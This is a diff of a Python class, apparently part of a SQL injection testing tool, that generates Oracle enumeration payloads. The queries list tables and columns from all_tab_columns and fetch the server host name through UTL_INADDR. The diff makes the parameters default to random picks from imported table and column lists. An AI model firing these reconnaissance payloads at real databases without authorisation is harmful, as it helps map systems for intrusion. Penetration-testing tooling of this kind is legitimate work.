@@ -3,10 +3,16 @@ This SQL command is selecting the global_name column from the global_name table.
 
 
 """
+import os
+import sys
+cur = os.getcwd()
+sys.path.append(cur)
+from INFO.common import tables,columns
+from random import choice
 
 class OraclePayloads:
     @staticmethod
-    def db_column_payload(column,table):
+    def db_column_payload(column=choice(columns),table=choice(tables)):
         payload = f"""
 
     SELECT {column} FROM {table};
@@ -18,7 +24,7 @@ class OraclePayloads:
         return str(retval)
     
     @staticmethod
-    def db_column_list(table,column,tablename="blah",owner="foo",**kwargs):
+    def db_column_list(table=choice(tables),column=choice(columns),tablename="blah",owner="foo",**kwargs):
         payload = f"""
 SELECT {column} FROM all_tab_columns WHERE {table} = '{tablename}';
 SELECT column_name FROM all_tab_columns WHERE {table} = '{tablename}' and owner = '{owner}';"""
@@ -41,7 +47,7 @@ SELECT {column} FROM {view};
         return str(retval)
     
     @staticmethod
-    def oracle_injection_database_list(column,table):
+    def oracle_injection_database_list(column=choice(columns),table=choice(tables)):
         payload = f"""
 SELECT DISTINCT {column} FROM {table};
  """
@@ -49,7 +55,7 @@ SELECT DISTINCT {column} FROM {table};
         return str(retval)
     
     @staticmethod 
-    def Host_name_oracle(hostname,viewcolumn,table):
+    def Host_name_oracle(hostname=choice(columns),viewcolumn=choice(columns),table=choice(tables)):
         payload = f"""
 SELECT {hostname} FROM {viewcolumn};
 SELECT UTL_INADDR.get_host_name FROM {table};
